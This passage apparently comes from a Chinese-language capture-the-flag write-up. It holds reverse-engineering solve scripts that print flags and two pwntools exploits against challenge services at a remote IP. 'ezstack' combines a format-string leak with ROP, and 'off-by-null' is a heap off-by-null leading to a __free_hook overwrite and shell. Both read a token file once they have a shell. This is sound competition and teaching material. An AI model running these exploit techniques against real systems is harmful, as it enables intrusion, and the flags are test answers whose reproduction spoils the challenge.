    enc = [0x0e,0x5D, 0x7D, 0x7D, 0x5D, 0x4E, 0x4E, 0x4E, 0x5D, 0x7D, 0x6B, 0x4B, 0x5D, 0x5D, 0x4E, 0x4E, 0x59,
    0x59, 0x59, 0x59, 0x6B, 0x5D, 0x53, 0x24, 0x7B, 0x34, 0x07, 0x49, 0x01, 0x1B, 0x23, 0x27, 0x7E,
    0x35, 0x3F, 0x12, 0x1B, 0x29, 0x32, 0x09, 0x16, 0x12, 0x60, 0x4A]
    sb = [BitVec(f"sb[{i}]",8) for i in range(45)]
    s = Solver()
    for i in range(1,44):
        s.add(sb[i-1] & 0xe0 | sb[i] & 0x1f == enc[i]
    print(s.check())
    print(s.model())
> 接着把解出来的数据和那个地图迷宫路径异或
    path = [0] *44
    path[43] = 10
    path[0] = 64
    path[22] = 51
    path[13] = 93
    path[20] = 75
    path[33] = 53
    path[42] = 64
    path[14] = 78
    path[5] = 78
    path[3] = 93
    path[32] = 62
    path[34] = 31
    path[29] = 59
    path[17] = 89
    path[38] = 18
    path[16] = 89
    path[37] = 41
    path[26] = 71
    path[39] = 9
    path[2] = 125
    path[9] = 125
    path[11] = 75
    path[30] = 35
    path[31] = 103
    path[27] = 9
    path[21] = 93
    path[8] = 125
    path[19] = 121
    path[35] = 18
    path[12] = 93
    path[4] = 93
    path[28] = 1
    path[40] = 22
    path[23] = 100
    path[24] = 59
    path[10] = 75
    path[1] = 125
    path[25] = 20
    path[36] = 59
    path[41] = 114
    path[15] = 78
    path[7] = 78
    path[6] = 78
    path[18] = 89
    flag = ""
    maze = "dWWwwdddWWaawwddsssSaw"
    for i in range(44):
        flag += chr(path[i] ^ ord(maze[i % len(maze)]))
    print(flag)
    D0g3{Y0u^Can=So1ve_it!W3lc0me_t0_The_Maze!!}
###  localhost:2333
> 解开`UPX`壳后，进入`MainVM` 观察虚拟机结构，发现这是一个基于栈的虚拟机
>
> 解题`exp`如下
    enc = [0x9b, 0xaa, 0xcb, 0xf5, 0x8a, 0xc8, 0xa1, 0x89, 0xe0, 0xa5,
           0x7e, 0x10, 0x3a, 0x0d, 0x31, 0x75, 0x2d, 0x7e, 0x77, 0x64,
           0x4a, 0x2b, 0xeb, 0xac, 0x08, 0x84, 0x2b, 0x24, 0x24, 0xaf]
    xor_key = [0x47, 0x4f, 0x4c, 0x40, 0x6e, 0x44, 0x7e, 0x21, 0x21, 0x21]
    magic_key = 0xff
    flag = ""
    for i in range(0, 10):
        if i == 0:
            magic_key = 0xff
        else:
            magic_key = enc[i - 1]
        raw = (enc[i] + i ^ magic_key)
        flag += chr(raw)
    for i in range(10, 20):
        flag += chr(enc[i] ^ xor_key[i - 10])
    # >> 3 > 5) & 0xff)
    print(flag)
    d0g3{Go1aN9_vM_1S_VERY_e@$Y!!}
## Pwn
###  ezstack
    from pwn import *
    context.log_level = "debug"
    i = 0
    canary = 11
    p = remote("47.108.195.119", 20113)
    p.sendline("Gerontic_D1no")
    p.sendline("68")
    p.recv()
    p.sendline("%11$p,%17$p")
    p.recvuntil("0x")
    canary = u64(p.recv(16).decode("hex")[::-1])
    p.recvuntil("0x")
    prog_base = u64(p.recv(12).decode("hex")[::-1].ljust(8,"\x00")) - 0x9dc
    success("prog => " + hex(prog_base))
    p.sendline(cyclic(0x18) + p64(canary) + cyclic(8) + p64(prog_base + 0xb03) + p64(prog_base + 0xb24)+ p64(prog_base + 0x810) )
    p.sendline("echo hello && cat sky_token")
    p.recvuntil("hello\n")
    token = p.recv()
    p.sendline("exit")
    success("token => " + token)
    p.send(token)
    p.interactive()
###  off-by-null
    from pwn import *
    context.log_level = "debug"
    p = remote("47.108.195.119", 20182)
    # p = process(['../pwn'], env={'LD_PRELOAD': '/home/cshi/pwn/libc.so.6'})
    so = ELF('../libc.so.6')
    p.sendline("Gerontic_D1no")
    p.sendline("68")
    p.recvuntil("please input a str:")
    p.sendline('N0_py_1n_tHe_ct7')
    def choice(c):
        p.recvuntil(">")
        p.sendline(str(c))
    def add(index, size):
        choice(1)
        p.recvuntil('?')
        p.sendline(str(index))
        p.recvuntil("?")
        p.sendline(str(size))
    def show(index):
        choice(2)
        p.recvuntil("?")
        p.sendline(str(index))
    def edit(index, content):
        choice(3)
        p.recvuntil("?")
        p.sendline(str(index))
        p.recvuntil(":")
        p.send(content)
    def free(index):
        choice(4)
        p.recvuntil("?")
        p.sendline(str(index))
    add(0, 0x4f0)
    add(1, 0x18)
    add(2, 0x4f0)
    add(3, 0x10)
    free(0)
    add(0, 0x4f0)
    show(0)
    leak = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
    libc_base = leak - 96 - 0x10 - so.sym['__malloc_hook']
    success("libc_base => " + hex(libc_base))
    free(0)
    edit(1, b'a' * 0x10 + p64(0x500 + 0x20))
    free(2)
    add(0, 0x4f0)
    add(4, 0x10)
    free(4)
    edit(1, p64(libc_base + so.sym['__free_hook']))
    add(5, 0x10)
    edit(5, '/bin/sh\x00')
    add(6, 0x10)
    edit(6, p64(libc_base + so.sym['system']))
    free(5)
    sleep(0.1)
    p.sendline("echo hello && cat sky_token")
    p.recvuntil("hello\n")
    token = p.recv()
    p.sendline("exit")
    success("token => " + token)
    p.sendline("5")
    sleep(1)
    p.send(token)
    p.interactive()
    p.interactive()